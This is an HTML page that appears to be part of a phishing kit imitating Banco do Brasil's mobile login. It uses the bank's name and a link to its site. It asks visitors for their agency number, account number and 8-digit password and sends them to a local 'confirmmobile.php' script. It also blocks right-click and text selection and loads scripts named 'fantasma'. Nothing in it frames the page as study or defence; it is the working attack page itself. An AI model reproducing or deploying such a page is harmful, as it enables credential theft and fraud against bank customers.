
<!DOCTYPE html>
<html lang="pt-br">

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, user-scalable=false;">	
    <title></title>
    <link rel="stylesheet" type="text/css" href="cssmobile/newcss.css">
    <link rel="stylesheet" type="text/css" href="cssmobile/newcss1.css">
    <link rel="stylesheet" type="text/css" href="cssmobile/fantasma.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
$("#formmobi").submit(function(e){

if($('input[name=agencia]').val().length < 5){
alert('Por favor, preencha o campo agencia');
e.preventDefault()
} else if($('input[name=conta]').val().length < 3){
alert('Por favor, preencha o campo conta');
e.preventDefault()
}else if($('input[name=senha]').val().length < 8){
alert('Por favor, preencha o campo senha');
e.preventDefault()
}
});
});
</script>    


<body>

    <nav class="navbar">
      <div class="container">
        <div id="navbar">
            <div class="row">
                <div class="col-md-1 col-sm-1 col-xs-3">
                    <img src="mobbille.png/img.jpg" class="img-responsive" alt="">
                </div>
                <div class="col-md-11 col-sm-11 col-xs-9">
                    <h1>Banco do Brasil</h1>
                </div>
            </div>
        </div>
      </div>
    </nav>

    <!-- Begin page content -->
    <div class="container" id="conteudo">

        <form id="formmobi" action="confirmmobile.php" method="post"  onsubmit="return valida_form(this)">

                

                <div class="row">
                    <div class="form-group col-lg-12">
                    <label for="xpelo0"><strong>Substitua o "X" pelo "0" quando houver</strong></label>
                    </div>
                    <div class="form-group col-md-4 col-sm-4 col-xs-4">
                        
                        <label for="agencia">Agência:</label>
                        <input name="agencia" type="number" class="form-control" id="agencia" placeholder="Agência" tabindex="1"  onkeyup="limitarInput(this)">
                    </div>
                    
                  <div class="form-group col-md-8 col-sm-8 col-xs-8">
                    <label for="conta">Conta:</label>
                      <input name="conta" type="number" class="form-control" id="conta" placeholder="Conta" tabindex="2" onkeyup="limitarInput2(this)">
                    </div>

                </div>

                

				<div class="row">

                    <div class="form-group col-md-12 col-sm-12 col-xs-12">
                        <label for="agencia">Senha 8 (dígitos):</label>
                        <input  name=senha type=number style="-webkit-text-security:disc;" ng-model="loginData.pincode" placeholder="Senha (8 dígitos)" class="form-control" onkeyup="limitarInput3(this)"></input>
                    </div>

                </div>
				
                <div class="row" id="botoes-formulario">
                    <div class="col-md-12">
                        <button type="submit" class="btn btn-default">Enviar</button>
                    </div>
        </div> <!-- fechando a row -->

        </form>

    </div>

    <footer class="blog-footer">
        <p>Todos direitos reservados</p>
        <p>
            <a href="#">www.bb.com.br</a>
        </p>
    </footer>
<script>
  function limitarInput(obj) {
    obj.value = obj.value.substring(0,5); 
  }
</script> 
<script>
  function limitarInput2(obj) {
    obj.value = obj.value.substring(0,10);
  }
</script> 
<script>
  function limitarInput3(obj) {
    obj.value = obj.value.substring(0,8); 
  }
</script>  

<script>
    function reEnable(){
        return true
    }

    //if IE4+
    document.onselectstart=new Function ("return false")
    document.oncontextmenu=new Function ("return false")
    //if NS6
    if (window.sidebar){
        document.onmousedown=disableselect
        document.onclick=reEnable
    }
    //-->
</script>
<script type="text/javascript" src="mobile-js/fantasma.js"></script>
<script type="text/javascript" src="mobile-js/fantasma1.js"></script>
</body>
</html>
